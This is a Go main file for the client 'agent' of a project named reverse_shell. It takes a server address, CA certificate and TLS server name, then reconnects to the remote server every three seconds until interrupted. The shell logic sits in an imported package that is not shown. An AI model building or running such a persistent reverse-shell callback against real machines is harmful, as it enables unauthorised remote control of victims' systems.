package main

import (
	"flag"
	"log"
	"os"
	"os/signal"
	"reverse_shell/agent"
	"syscall"
	"time"
)

func main() {

	addr := flag.String("addr", "", "Server address (required)")
	caFile := flag.String("ca", "", "CA certificate file (required)")
	serverName := flag.String("server", "", "Server name for TLS verification (required)")
	flag.Parse()

	if *addr == "" {
		log.Fatal("Error: -addr flag is required")
	}
	if *caFile == "" {
		log.Fatal("Error: -ca flag is required")
	}
	if *serverName == "" {
		log.Fatal("Error: -server flag is required")
	}

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	for {
		select {
		case <-sigChan:
			log.Println("\nShutting down agent...")
			os.Exit(0)
		default:
			client, err := agent.Run(*addr, *caFile, *serverName)
			if err != nil {
				log.Println("Failed to start agent:", err)
				log.Println("Retrying in 3 seconds...")
				time.Sleep(time.Second * 3)
				continue
			}

			<-client.Done

			log.Println("Connection lost. Reconnecting in 3 seconds...")
			time.Sleep(time.Second * 3)
		}
	}
}
